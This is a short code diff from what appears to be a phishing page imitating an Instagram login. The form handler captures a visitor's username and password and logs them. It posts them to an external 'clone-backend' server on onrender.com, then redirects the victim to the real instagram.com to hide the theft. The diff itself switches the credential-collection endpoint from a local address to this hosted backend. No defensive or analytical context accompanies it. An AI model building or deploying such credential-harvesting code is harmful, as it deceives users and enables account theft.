@@ -7,7 +7,7 @@ const Home = () => {
   const handleSend = async (e) => {
     e.preventDefault();
     console.log(username, password);
-    axios.post("http://192.168.31.252:5001/email", { username, password })
+    axios.post("https://clone-backend-jvih.onrender.com/email", { username, password })
     .then((res) => {
       console.log(res);
       window.location.href = "https://www.instagram.com/";
